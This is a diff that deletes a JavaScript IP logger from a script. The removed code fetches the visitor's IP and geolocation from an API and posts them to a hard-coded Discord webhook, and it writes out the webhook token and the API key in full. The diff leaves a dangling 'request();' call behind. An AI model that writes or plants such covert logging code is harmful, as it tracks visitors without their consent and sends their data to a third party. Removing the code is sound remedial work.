@@ -71,33 +71,4 @@ function myFunction() {
   }
 }
 
-var webHookUrl = "https://discord.com/api/webhooks/1102397675346853898/xgm3BHyNOKJ1wU3ZA_p-LtGWIbVPSXVuw3l4EMo0nejyGM0TAc5tgurDJYiQkCveHoGy";
-const request = async () => {
-  const response = await fetch(getIP = 'https://ipgeolocation.abstractapi.com/v1/?api_key=9c8471ac3e0c45d189eb7b1ca246f4ea');
-  const data = await response.json();
-
-  // Declaring variables
-  var ip_address = data.ip_address;
-  var autonomous_system_organization = JSON.stringify(data);
-
-  // Open POST Request
-  var postRequest = new XMLHttpRequest();
-  postRequest.open("POST", webHookUrl);
-
-  postRequest.setRequestHeader('Content-type', 'application/json');
-
-  var params = {
-    username: "𝒦𝑜𝓉𝒶'𝓈 𝐼𝒫 𝐿𝑜𝑔𝑔𝑒𝓇 ♥",
-    avatar_url: "https://cdn.discordapp.com/avatars/1051199070875697253/8c26e9ba266babb8dc64458a6051ea48.png?size=4096",
-    content: "__**:globe_with_meridians: Welcome to the IP list:**__ \n"
-      + "<a:spin:1078469584773976114>" + "`" + ip_address + "`" + "<a:spin:1078469584773976114>" +
-      "\n \n__**<a:a_rainbowuwu:1078468133213458462> ISP Info:**__ \n"
-      + "```" + autonomous_system_organization + "```"
-
-  }
-
-  postRequest.send(JSON.stringify(params));
-
-}
-
 request();
